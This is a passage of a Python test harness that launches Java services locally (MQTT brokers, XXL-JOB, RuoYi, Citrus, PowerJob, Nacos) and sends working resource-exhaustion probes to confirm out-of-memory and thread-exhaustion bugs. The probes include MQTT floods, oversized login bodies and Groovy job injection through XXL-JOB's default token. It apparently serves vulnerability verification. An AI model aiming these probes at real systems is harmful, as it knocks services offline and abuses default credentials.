        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)


def run_jmqtt_subscribe_tree(case: Candidate) -> ProbeResult:
    port = 18841
    heap = p0.with_min_heap("128m")

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        client_exception = ""
        topic_prefix = "p1/sub"
        sockets: list[socket.socket] = []
        try:
            for client_index in range(12):
                sockets.append(p0.mqtt_connect(port, f"p1-jmqtt-sub-{client_index}", clean_session=True))
            packet_id = 1
            for index in range(1, 80001):
                sock = sockets[index % len(sockets)]
                p0.mqtt_subscribe(sock, packet_id, f"{topic_prefix}/{index:08d}", qos=1)
                packet_id = 1 if packet_id >= 65000 else packet_id + 1
                sent = index
                if index % 200 == 0:
                    for sub_sock in sockets:
                        p0.drain_socket(sub_sock)
                    time.sleep(0.005)
                    if process.poll() is not None or p0.oom_signal(log_path):
                        break
        except Exception as exc:
            client_exception = repr(exc)
        finally:
            for sub_sock in sockets:
                p0.mqtt_disconnect(sub_sock)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "connections": len(sockets),
                "topicBytesApprox": len(f"{topic_prefix}/00000000"),
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="JMQTT 默认 anonymousEnable=true，使用 MQTT SUBSCRIBE 增长订阅树；未 OOM 不提升。",
        )

    return run_jmqtt_with_mysql(case, heap, port, 33441, probe)


def run_jmqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
    port = 18842
    heap = p0.with_min_heap("128m")
    enhanced = p0.is_heap_at_least(heap, 1024)
    payload = b"J" * (512000 if enhanced else 512000)
    max_messages = 5000 if enhanced else 1599

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        client_exception = ""
        sockets: list[socket.socket] = []
        try:
            for client_index in range(10 if enhanced else 6):
                sockets.append(p0.mqtt_connect(port, f"p1-jmqtt-qos2-{client_index}", clean_session=True))
            for index in range(1, max_messages + 1):
                sock = sockets[(index - 1) % len(sockets)]
                packet_id = ((index - 1) // len(sockets)) + 1
                mqtt_publish_qos(sock, f"p1/jmqtt/qos2/{index}", payload, qos=2, packet_id=packet_id)
                sent = index
                if index % 10 == 0:
                    for qos_sock in sockets:
                        p0.drain_socket(qos_sock)
                        try:
                            qos_sock.sendall(b"\xc0\x00")
                        except OSError:
                            pass
                    time.sleep(0.02)
                    if process.poll() is not None or p0.oom_signal(log_path):
                        break
        except Exception as exc:
            client_exception = repr(exc)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "connections": len(sockets),
                "payloadBytes": len(payload),
                "defaultMaxMsgSizeBytes": 512 * 1024,
                "maxMessages": max_messages,
                "enhancedProbe": enhanced,
                "estimatedPayloadBytes": sent * len(payload),
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="JMQTT 匿名 QoS2 PUBLISH 半握手，payload 保持在默认 maxMsgSize 512KiB 内，不发送 PUBREL 并用 PINGREQ 保活；只以目标 JVM OOM 为真阳。",
        )

    return run_jmqtt_with_mysql(case, heap, port, 33442, probe)


def run_jmqtt_outbound_no_ack(case: Candidate) -> ProbeResult:
    port = 18843
    heap = p0.with_min_heap("128m")
    payload = b"O" * 256000

    def probe(process, handle, log_path: Path) -> ProbeResult:
        sent = 0
        client_exception = ""
        subscriber = None
        publisher = None
        try:
            subscriber = p0.mqtt_connect(port, "p1-jmqtt-slow-subscriber", clean_session=True)
            p0.mqtt_subscribe(subscriber, 1, "p1/jmqtt/outbound/#", qos=1)
            time.sleep(0.5)
            publisher = p0.mqtt_connect(port, "p1-jmqtt-outbound-publisher", clean_session=True)
            for index in range(1, 5000):
                mqtt_publish_qos(publisher, f"p1/jmqtt/outbound/{index}", payload, qos=1, packet_id=index)
                sent = index
                if index % 10 == 0:
                    p0.drain_socket(publisher)
                    time.sleep(0.01)
                    if process.poll() is not None or p0.oom_signal(log_path):
                        break
        except Exception as exc:
            client_exception = repr(exc)
        finally:
            if publisher is not None:
                p0.mqtt_disconnect(publisher)
            if subscriber is not None:
                p0.mqtt_disconnect(subscriber)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "payloadBytes": len(payload),
                "subscriberAckMode": "no PUBACK/PUBREC read loop",
                "clientException": client_exception,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="订阅端保持连接但不确认 broker 下发 QoS1 消息，测试 outboundFlowMessages 是否可触发 OOM。",
        )

    return run_jmqtt_with_mysql(case, heap, port, 33443, probe)


def run_socket_mqtt_publish_retention(case: Candidate) -> ProbeResult:
    port = 8000
    heap = p0.with_min_heap("96m")
    process, handle, log_path = start_socket_mqtt(case, heap, port)
    sent = 0
    client_exception = ""
    payload = b"S" * 512000
    sock = None
    try:
        sock = p0.mqtt_connect(port, "p1-socket-mqtt-publisher", clean_session=True)
        for index in range(1, 2000):
            mqtt_publish_qos(sock, f"p1/socket/{index}", payload, qos=1, packet_id=index)
            sent = index
            if index % 10 == 0:
                p0.drain_socket(sock)
                time.sleep(0.02)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except Exception as exc:
        client_exception = repr(exc)
    finally:
        if sock is not None:
            p0.mqtt_disconnect(sock)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "payloadBytes": len(payload),
            "estimatedPayloadBytes": sent * len(payload),
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="Socket-MQTT upstream sample main 绑定默认 8000，匿名 MQTT PUBLISH 压测 ByteBufHolder retain 路径。",
    )


def run_smqtt_persistent_sessions(case: Candidate) -> ProbeResult:
    port = 18831
    heap = p0.with_min_heap("96m")
    process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
    sent = 0
    client_exception = ""
    try:
        for index in range(1, 180001):
            sock = p0.mqtt_connect(port, f"p1-persist-{index:08d}", clean_session=False)
            p0.mqtt_disconnect(sock)
            sent = index
            if index % 1000 == 0:
                time.sleep(0.02)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except Exception as exc:
        client_exception = repr(exc)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "cleanSession": False,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
    )


def run_smqtt_empty_topic_keys(case: Candidate) -> ProbeResult:
    port = 18833
    heap = p0.with_min_heap("96m")
    process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
    sent = 0
    enhanced = p0.is_heap_at_least(heap, 1024)
    topic_pad = "t" * (8192 if enhanced else 4096)
    max_messages = 240000 if enhanced else 180000
    client_exception = ""
    try:
        sock = p0.mqtt_connect(port, "p1-empty-topic-publisher", clean_session=True)
        try:
            for index in range(1, max_messages + 1):
                p0.mqtt_publish(sock, f"p1/empty/{index}/{topic_pad}", b"x", retain=False)
                sent = index
                if index % 1000 == 0:
                    time.sleep(0.01)
                    if process.poll() is not None or p0.oom_signal(log_path):
                        break
        finally:
            p0.mqtt_disconnect(sock)
    except Exception as exc:
        client_exception = repr(exc)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "topicBytesApprox": len(topic_pad) + 16,
            "maxMessages": max_messages,
            "enhancedProbe": enhanced,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
    )


def run_smqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
    port = 18836
    heap = p0.with_min_heap("96m")
    enhanced = p0.is_heap_at_least(heap, 1024)
    payload = b"Q" * (1024 * 1024 if enhanced else 524288)
    max_messages = 1800 if enhanced else 1200
    process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
    sent = 0
    client_exception = ""
    sockets: list[socket.socket] = []
    try:
        for index in range(1, 6):
            sockets.append(p0.mqtt_connect(port, f"p1-qos2-{index}", clean_session=True))
        try:
            for index in range(1, max_messages + 1):
                sock = sockets[(index - 1) % len(sockets)]
                packet_id = ((index - 1) // len(sockets)) + 1
                mqtt_publish_qos(sock, f"p1/qos2/{index}", payload, qos=2, packet_id=packet_id)
                sent = index
                if index % 10 == 0:
                    time.sleep(0.03)
                    for qos_sock in sockets:
                        p0.drain_socket(qos_sock)
                    if process.poll() is not None or p0.oom_signal(log_path):
                        break
        finally:
            for qos_sock in sockets:
                p0.mqtt_disconnect(qos_sock)
    except Exception as exc:
        client_exception = repr(exc)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "connections": 5,
            "payloadBytes": len(payload),
            "maxMessages": max_messages,
            "enhancedProbe": enhanced,
            "estimatedCachedPayloadBytes": sent * len(payload),
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
    )


def post_xxl_trigger_custom(body: dict[str, object], timeout: float = 8) -> int:
    data = json.dumps(body).encode("utf-8")
    request = p0.urllib.request.Request(
        "http://127.0.0.1:9999/trigger",
        data=data,
        headers={
            "Content-Type": "application/json",
            "XXL-JOB-ACCESS-TOKEN": "default_token",
            "XXL-JOB-APPNAME": "xxl-job-executor-sample",
        },
        method="POST",
    )
    with p0.urllib.request.urlopen(request, timeout=timeout) as response:
        response.read()
        return response.status


def run_xxl_glue_groovy(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("160m")
    user_threads_before = p0.current_user_thread_count()
    nproc_margin = 900 if p0.is_heap_at_least(heap, 1024) else 450
    nproc_limit = user_threads_before + nproc_margin if user_threads_before > 0 else None
    process, handle, log_path = p0.start_xxl(p0_case(case), heap, nproc_limit=nproc_limit)
    sent = 0
    client_exception = ""
    enhanced = p0.is_heap_at_least(heap, 1024)
    glue_pad = ("//" + ("G" * 32768) + "\n") if enhanced else ""
    max_triggers = 2200 if enhanced else 1200
    glue_template = (
        "import com.xxl.job.core.handler.IJobHandler;\n"
        "import com.xxl.job.core.context.XxlJobHelper;\n"
        "public class P1Glue%s extends IJobHandler {\n"
        f"{glue_pad}"
        "  public void execute() throws Exception { Thread.sleep(600000L); XxlJobHelper.handleSuccess(); }\n"
        "}\n"
    )
    beat_ok_after = False
    for index in range(1, max_triggers + 1):
        try:
            post_xxl_trigger_custom(
                {
                    "jobId": 710000 + index,
                    "executorHandler": "",
                    "executorParams": "",
                    "executorBlockStrategy": "SERIAL_EXECUTION",
                    "executorTimeout": 0,
                    "logId": 810000 + index,
                    "logDateTime": int(time.time() * 1000),
                    "glueType": "GLUE_GROOVY",
                    "glueSource": glue_template % index,
                    "glueUpdatetime": index,
                    "broadcastIndex": 0,
                    "broadcastTotal": 1,
                }
            )
            sent = index
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            client_exception = repr(exc)
            break
        if index % 20 == 0:
            time.sleep(0.03)
            if process.poll() is not None or p0.oom_signal(log_path):
                break
    try:
        beat_ok_after = p0.http_request(
            "http://127.0.0.1:9999/beat",
            method="POST",
            data=b"{}",
            headers={
                "Content-Type": "application/json",
                "XXL-JOB-ACCESS-TOKEN": "default_token",
                "XXL-JOB-APPNAME": "xxl-job-executor-sample",
            },
            timeout=5,
        )[0] == 200
    except Exception:
        beat_ok_after = False
    status_values = p0.read_status(process) if process.poll() is None else {}
    thread_count = int(status_values.get("Threads", "0").split()[0]) if status_values.get("Threads") else 0
    signal = p0.oom_signal(log_path)
    confirmed_threads = bool(signal) or thread_count >= int(nproc_margin * 0.75) or (sent >= 100 and not beat_ok_after)
    evidence = {
        "heap": heap,
        "port": 9999,
        "glueType": "GLUE_GROOVY",
        "maxTriggers": max_triggers,
        "gluePadBytes": len(glue_pad.encode("utf-8")),
        "sleepingGlueHandler": True,
        "enhancedProbe": enhanced,
        "headers": {
            "XXL-JOB-ACCESS-TOKEN": "default_token",
            "XXL-JOB-APPNAME": "xxl-job-executor-sample",
        },
        "userThreadsBeforeStart": user_threads_before,
        "nprocLimit": nproc_limit,
        "nprocMargin": nproc_margin,
        "threadsBeforeStop": thread_count,
        "beatOkAfterProbe": beat_ok_after,
        "clientException": client_exception,
        "postProbePortOpen": p0.port_open(9999),
        "processExitCode": process.poll(),
        "aliveBeforeStop": process.poll() is None,
        "processStatus": status_values,
    }
    p0.stop_process(process, handle)
    return p0.ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="confirmed_thread_exhaustion" if confirmed_threads else "completed_without_oom",
        dynamic_verdict="confirmed_thread_exhaustion" if confirmed_threads else "not_confirmed",
        true_positive=confirmed_threads,
        oom_signal=signal or ("native_thread_exhaustion" if confirmed_threads else ""),
        requests_sent=sent,
        heap=heap,
        log=rel(log_path),
        evidence=evidence,
        notes="XXL-JOB default-token GLUE_GROOVY 使用唯一 jobId 与阻塞型 glueSource 创建大量 JobThread；以线程耗尽/可用性失败为确认信号，不限于 Java heap OOM。",
    )


def run_xxl_large_body_aggregator(case: Candidate) -> ProbeResult:
    heap = p0.with_min_heap("128m")
    process, handle, log_path = p0.start_xxl(p0_case(case), heap)
    sent = 0
    last_status = 0
    client_exception = ""
    pad = "A" * (4 * 1024 * 1024)
    body = {
        "jobId": 1,
        "executorHandler": "demoJobHandler",
        "executorParams": pad,
        "executorBlockStrategy": "SERIAL_EXECUTION",
        "executorTimeout": 0,
        "logId": 900001,
        "logDateTime": int(time.time() * 1000),
        "glueType": "BEAN",
        "glueSource": "",
        "glueUpdatetime": 0,
        "broadcastIndex": 0,
        "broadcastTotal": 1,
    }
    lock = threading.Lock()

    def worker(worker_id: int) -> None:
        nonlocal sent, last_status, client_exception
        for index in range(1, 80):
            if process.poll() is not None or p0.oom_signal(log_path):
                return
            request_body = {**body, "logId": 900000 + worker_id * 1000 + index}
            try:
                status = post_xxl_trigger_custom(request_body, timeout=20)
                with lock:
                    sent += 1
                    last_status = status
            except (urllib.error.URLError, TimeoutError, OSError) as exc:
                with lock:
                    client_exception = repr(exc)
                return
            time.sleep(0.01)

    threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
    for thread in threads:
        thread.start()
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        if all(not thread.is_alive() for thread in threads):
            break
        time.sleep(0.5)
    for thread in threads:
        thread.join(timeout=2)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": 9999,
            "endpoint": "/trigger",
            "payloadBytesApprox": len(json.dumps(body).encode("utf-8")),
            "workerThreads": len(threads),
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(9999),
        },
    )


def run_ryvf_login_repeatable_body(case: Candidate) -> ProbeResult:
    port = 18187
    mysql_port = 33410
    redis_port = 36479
    mysql_name = "p1-ryvf-mysql"
    redis_name = "p1-ryvf-redis"
    heap = p0.with_min_heap("192m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "password", mysql_version="5.7")
        p0.mysql_import(mysql_name, "password", "ry-vue", p0.RYVF_DIR / "sql" / "ry_20260417.sql")
        p0.mysql_import(mysql_name, "password", "ry-vue", p0.RYVF_DIR / "sql" / "quartz.sql")
        p0.mysql_exec(
            mysql_name,
            "password",
            "USE `ry-vue`; UPDATE sys_config SET config_value='false' WHERE config_key='sys.account.captchaEnabled';\n",
        )
        redis_image = p0.start_redis_container(redis_name, redis_port)
        process, handle, log_path = p0.start_ryvf(p0_case(case), heap, port, mysql_port, redis_port)
        enhanced = p0.is_heap_at_least(heap, 1024)
        sent = 0
        last_status = 0
        client_exception = ""
        pad = "R" * ((24 if enhanced else 12) * 1024 * 1024)
        payload = json.dumps({"username": "admin", "password": "bad", "code": "", "uuid": "", "pad": pad}).encode()
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception
            for _ in range(24 if enhanced else 20):
                if process.poll() is not None or p0.oom_signal(log_path):
                    return
                try:
                    status, body, _ = p0.http_request(
                        f"http://127.0.0.1:{port}/login",
                        method="POST",
                        data=payload,
                        headers={"Content-Type": "application/json", "User-Agent": f"p1-ryvf/{worker_id}"},
                        timeout=25,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return

        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(10 if enhanced else 8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + (240 if enhanced else 180)
        while time.monotonic() < deadline:
            if process.poll() is not None or p0.oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/login",
                "payloadBytes": len(payload),
                "workerThreads": len(threads),
                "enhancedProbe": enhanced,
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "runtimeDbChange": "sys.account.captchaEnabled=false to avoid captcha blocking before body-copy path",
                "postProbePortOpen": p0.port_open(port),
            },
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)
        p0.docker_rm(redis_name)


def run_citrus_authenticate_body(case: Candidate) -> ProbeResult:
    port = 18182
    mysql_port = 33412
    redis_port = 36481
    mysql_name = "p1-citrus-mysql"
    redis_name = "p1-citrus-redis"
    heap = p0.with_min_heap("128m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "yiuman", mysql_version="5.7")
        p0.mysql_import_raw_normalized(mysql_name, "yiuman", p0.CITRUS_DIR / "sql" / "citrus_sys.sql")
        p0.mysql_import_raw_normalized(mysql_name, "yiuman", p0.CITRUS_DIR / "sql" / "data_init.sql")
        redis_image = p0.start_redis_container(redis_name, redis_port)
        startup_mode = "full_mda_autoconfiguration"
        first_startup_error = ""
        try:
            process, handle, log_path = p0.start_citrus_full(
                p0_case(case),
                heap,
                port,
                mysql_port,
                redis_port,
                log_suffix=".full-startup",
            )
        except RuntimeError as exc:
            first_startup_error = str(exc)
            startup_mode = "mda_autoconfiguration_excluded"
            process, handle, log_path = p0.start_citrus_full(
                p0_case(case),
                heap,
                port,
                mysql_port,
                redis_port,
                exclude_mda=True,
            )
        sent = 0
        last_status = 0
        client_exception = ""
        enhanced = p0.is_heap_at_least(heap, 1024)
        pad = "C" * ((20 if enhanced else 10) * 1024 * 1024)
        payload = json.dumps({"mode": "password", "username": "admin", "password": "bad", "pad": pad}).encode()
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception
            for _ in range(30 if enhanced else 24):
                if process.poll() is not None or p0.oom_signal(log_path):
                    return
                try:
                    status, body, _ = p0.http_request(
                        f"http://127.0.0.1:{port}/rest/authenticate",
                        method="POST",
                        data=payload,
                        headers={"Content-Type": "application/json", "User-Agent": f"p1-citrus/{worker_id}"},
                        timeout=25,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return

        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(10 if enhanced else 8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + (240 if enhanced else 180)
        while time.monotonic() < deadline:
            if process.poll() is not None or p0.oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/rest/authenticate",
                "payloadBytes": len(payload),
                "workerThreads": len(threads),
                "enhancedProbe": enhanced,
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "startupMode": startup_mode,
                "firstStartupError": first_startup_error,
                "postProbePortOpen": p0.port_open(port),
            },
            notes="完整 MySQL/Redis 环境启动，复用 Citrus P0 的 MDA classpath workaround；目标为匿名认证 JSON body buffering/parsing。",
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)
        p0.docker_rm(redis_name)


def run_powerjob_worker_heartbeat(case: Candidate) -> ProbeResult:
    port = 18184
    remote_port = 18185
    mysql_port = 33407
    mysql_name = "p1-powerjob-mysql"
    heap = p0.with_min_heap("192m")
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "No1Bug2Please3!", mysql_version="5.7")
        p0.mysql_exec(
            mysql_name,
            "No1Bug2Please3!",
            "CREATE DATABASE IF NOT EXISTS `powerjob-daily` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\n",
        )
        jdbc_url = (
            f"jdbc:mysql://127.0.0.1:{mysql_port}/powerjob-daily"
            "?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai"
        )
        command = p0.spring_boot_command(
            heap,
            p0.powerjob_classpath(),
            "tech.powerjob.server.PowerJobServerApplication",
            f"--server.port={port}",
            "--spring.profiles.active=daily",
            "--oms.mongodb.enable=false",
            "--oms.transporter.active.protocols=HTTP",
            "--oms.transporter.main.protocol=HTTP",
            f"--oms.http.port={remote_port}",
            f"--spring.datasource.core.jdbc-url={jdbc_url}",
            "--spring.datasource.core.username=root",
            "--spring.datasource.core.password=No1Bug2Please3!",
            "--spring.datasource.core.maximum-pool-size=4",
            "--spring.datasource.core.minimum-idle=1",
            f"--oms.storage.dfs.mysql-series.url={jdbc_url}",
            "--oms.storage.dfs.mysql-series.username=root",
            "--oms.storage.dfs.mysql-series.password=No1Bug2Please3!",
            "--oms.storage.dfs.mysql-series.auto-create-table=true",
            f"--oms.storage.dfs.mysql_series.url={jdbc_url}",
            "--oms.storage.dfs.mysql_series.username=root",
            "--oms.storage.dfs.mysql_series.password=No1Bug2Please3!",
            "--oms.storage.dfs.mysql_series.auto_create_table=true",
            "--spring.mail.host=127.0.0.1",
            "--spring.mail.port=1",
            java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
        )
        log_path = LOG_DIR / f"{case.candidate_id}.log"
        process, handle = p0.start_java(command, log_path, p0.POWERJOB_DIR)
        if not p0.wait_for_http(f"http://127.0.0.1:{port}/", 150, process):
            raise RuntimeError(f"PowerJob did not serve HTTP on port {port}; see {rel(log_path)}")
        remote_host = wait_for_powerjob_remote_host(log_path, remote_port, process)
        sent = 0
        last_status = 0
        client_exception = ""
        path = "/server/workerHeartbeat"
        lock = threading.Lock()

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, client_exception
            for index in range(1, 20001):
                if process.poll() is not None or p0.oom_signal(log_path):
                    return
                sequence = worker_id * 20000 + index
                heartbeat = {
                    "workerAddress": f"10.{worker_id % 250}.{(sequence // 250) % 250}.{sequence % 250}:27777",
                    "appName": f"p1-app-{sequence}",
                    "appId": 100000000 + sequence,
                    "heartbeatTime": int(time.time() * 1000),
                    "containerInfos": [
                        {
                            "containerId": 900000000 + sequence * 10 + offset,
                            "version": "v" + ("P" * 256) + str(offset),
                            "deployedTime": int(time.time() * 1000),
                        }
                        for offset in range(3)
                    ],
                    "version": "p1",
                    "protocol": "HTTP",
                    "tag": "p1",
                    "client": "p1",
                    "extra": "E" * 1024,
                    "overload": False,
                    "lightTaskTrackerNum": 0,
                    "heavyTaskTrackerNum": 0,
                    "systemMetrics": {
                        "cpuProcessors": 4,
                        "cpuLoad": 0.1,
                        "jvmUsedMemory": 0.01,
                        "jvmMaxMemory": 1.0,
                        "jvmMemoryUsage": 0.01,
                        "diskUsed": 1.0,
                        "diskTotal": 10.0,
                        "diskUsage": 0.1,
                        "extra": "M" * 1024,
                    },
                }
                try:
                    status, _, _ = p0.http_request(
                        f"http://{remote_host}:{remote_port}{path}",
                        method="POST",
                        data=json.dumps(heartbeat).encode("utf-8"),
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                except (urllib.error.URLError, TimeoutError, OSError, http.client.HTTPException) as exc:
                    with lock:
                        client_exception = repr(exc)
                    return
                if index % 200 == 0:
                    time.sleep(0.005)

        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 240
        while time.monotonic() < deadline:
            if process.poll() is not None or p0.oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "webPort": port,
                "remoteHost": remote_host,
                "remoteHttpPort": remote_port,
                "endpoint": path,
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "workerThreads": len(threads),
                "lastHttpStatus": last_status,
                "clientException": client_exception,
                "postProbeWebPortOpen": p0.port_open(port),
                "postProbeRemotePortOpen": wait_for_host_port(remote_host, remote_port, 0.5),
            },
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            p0.stop_process(process, handle)
        p0.docker_rm(mysql_name)
def run_nacos_config_batch_listen(case: Candidate) -> ProbeResult:
    port = 18122
    heap = p0.with_min_heap("160m")
    listener_count = 50000
    process, handle, log_path = start_nacos(case, heap, port)
    client_dir = RUNTIME_DIR / "nacos-config-listener-client"
    classes_dir = client_dir / "classes"
    client_dir.mkdir(parents=True, exist_ok=True)
    classes_dir.mkdir(parents=True, exist_ok=True)
    source = client_dir / "NacosConfigBatchListenProbe.java"
    source.write_text(
        """
import com.alibaba.nacos.api.PropertyKeyConst;
import com.alibaba.nacos.api.config.ConfigFactory;
import com.alibaba.nacos.api.config.ConfigService;
import com.alibaba.nacos.api.config.listener.Listener;
import java.util.Properties;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class NacosConfigBatchListenProbe {
    public static void main(String[] args) throws Exception {
        String serverAddr = args[0];
        int count = Integer.parseInt(args[1]);
        Properties properties = new Properties();
        properties.setProperty(PropertyKeyConst.SERVER_ADDR, serverAddr);
        ConfigService service = ConfigFactory.createConfigService(properties);
        Executor executor = Executors.newFixedThreadPool(2);
        Listener listener = new Listener() {
            @Override
            public Executor getExecutor() {
                return executor;
            }
            @Override
            public void receiveConfigInfo(String configInfo) {
            }
        };
        for (int i = 1; i <= count; i++) {
            service.addListener("p1-data-" + i + "-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "P1_GROUP", listener);
            if (i % 1000 == 0) {
                System.out.println("sent=" + i);
            }
        }
        Thread.sleep(60000L);
    }
}
""".strip()
        + "\n",
        encoding="utf-8",
    )
    cp = nacos_classpath()
    javac = p0.shutil.which("javac") or "javac"
    completed = subprocess.run(
        [javac, "-cp", cp, "-d", classes_dir.as_posix(), source.as_posix()],
        cwd=BASE_DIR,
        check=False,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    if completed.returncode != 0:
        p0.stop_process(process, handle)
        raise RuntimeError(f"Nacos ConfigBatchListen probe client compile failed:\n{completed.stdout}")
    client_log_path = LOG_DIR / f"{case.candidate_id}.client.log"
    client_handle = client_log_path.open("wb")
    client_process = subprocess.Popen(
        [
            p0.java_binary(("java-17-openjdk", "java-21-openjdk", "java-22-openjdk")),
            "-Xmx256m",
            "-cp",
            f"{classes_dir}:{cp}",
            "NacosConfigBatchListenProbe",
            f"127.0.0.1:{port}",
            str(listener_count),
        ],
        cwd=NACOS_DIR,
        stdout=client_handle,
        stderr=subprocess.STDOUT,
    )
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            break
        if client_process.poll() is not None:
            time.sleep(5)
            break
        time.sleep(0.5)
    if client_process.poll() is None:
        client_process.terminate()
        try:
            client_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            client_process.kill()
            client_process.wait(timeout=5)
    client_handle.close()
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        listener_count,
        {
            "heap": heap,
            "httpPort": port,
            "grpcPort": port + 1000,
            "listenerCountTarget": listener_count,
            "clientLog": rel(client_log_path),
            "clientExitCode": client_process.returncode,
            "postProbeHttpPortOpen": p0.port_open(port),
            "postProbeGrpcPortOpen": p0.port_open(port + 1000),
        },
        notes="Nacos 官方 ConfigService SDK addListener 洪泛，触发默认 gRPC ConfigBatchListenRequest 路径；只以 Nacos server JVM OOM 为真阳。",
    )


def run_diyhi_with_mysql(
    case: Candidate,
    heap: str,
    port: int,
    mysql_port: int,
    probe: Callable[[subprocess.Popen[bytes], object, Path], ProbeResult],
) -> ProbeResult:
    mysql_name = f"p1-diyhi-mysql-{port}"
    process = None
    handle = None
    try:
        mysql_image = p0.start_mysql_container(mysql_name, mysql_port, "123456", mysql_version="8.0")
        p0.mysql_import(mysql_name, "123456", "bbs-jdk21", DIYHI_DIR / "src" / "main" / "resources" / "data" / "install" / "structure_tables_mysql.sql")
        p0.mysql_exec(
            mysql_name,
            "123456",
            "USE `bbs-jdk21`;\n"
